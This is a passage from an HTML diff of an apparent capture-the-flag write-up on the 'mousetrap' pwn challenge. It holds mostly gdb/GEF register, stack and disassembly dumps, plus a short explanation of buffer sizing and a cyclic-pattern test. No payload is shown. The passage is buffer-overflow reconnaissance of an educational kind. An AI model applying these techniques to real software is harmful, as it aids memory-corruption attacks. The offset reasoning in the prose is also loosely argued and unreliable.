+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb60&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb70&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdcb0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdc90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004007b9&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400610&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2d&lt;/span&gt;              
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000400950&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x4500203a656d614e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Name: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x246&lt;/span&gt;             
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000400630&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdd90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x0000000000000001&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;zero&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;carry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parity&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;adjust&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INTERRUPT&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;direction&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resume&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;virtualx86&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;identification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0033&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x002b&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt; 
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb60&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;	 &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb68&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0008&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdc90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`__libc_csu_init+0`&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb70&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0010&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdcb0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;	 &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb78&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0018&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040087d&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb80&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdd98&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00007fffffffe120&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb88&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0028&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000001ffffdcd0&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb90&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0030&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb98&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;│&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0038&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007ac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007b1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+     &lt;span class=&quot;mh&quot;&gt;0x4007b4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4007b9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x400610&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&quot;err&quot;&gt;↳&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x400610&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x200a22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# 0x601038 &amp;lt;read@got.plt&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;mh&quot;&gt;0x400616&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+        &lt;span class=&quot;mh&quot;&gt;0x40061b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4005c0&lt;/span&gt;
+        &lt;span class=&quot;mh&quot;&gt;0x400620&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;QWORD&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x200a1a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# 0x601040 &amp;lt;setvbuf@got.plt&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;mh&quot;&gt;0x400626&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;
+        &lt;span class=&quot;mh&quot;&gt;0x40062b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x4005c0&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;guessed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+   &lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdc90&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`libc_csu_init+0`&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000000020&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#0] Id 1, Name: &quot;mousetrap&quot;, stopped 0x4007b9 in `set_mouse_name` (), reason: SINGLE STEP&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trace&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#0] 0x4007b9 → `set_mouse_name()`&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#1] 0x40087d → main()&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;There you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;$rdx&lt;/code&gt;=&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000000020&lt;/code&gt; which is hex value and it allocates 32 bytes of data from input. But given file was 64bit(&lt;code class=&quot;highlighter-rouge&quot;&gt;8*8=64&lt;/code&gt;) so 8 bytes was allocated for &lt;code class=&quot;highlighter-rouge&quot;&gt;rbp&lt;/code&gt;. So the actually bytes that was allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable was 24(32-8)bytes.
@@ -177,97 +185,97 @@ As soon as I got I can check that in gdb.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;32 bytes data:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  pattern create 32
-[+] Generating a pattern of 32 bytes
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
-[+] Saved as '$_gef0'
-gef➤  run
-Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
-Welcome little mouse
-can you steal the cheese from the mouse trap
-Name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
-Enter Code Sequence of 7016996765293437284: SNAAAAAAAP! you died![Inferior 1 (process 11792) exited normally]
-gef➤ 
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
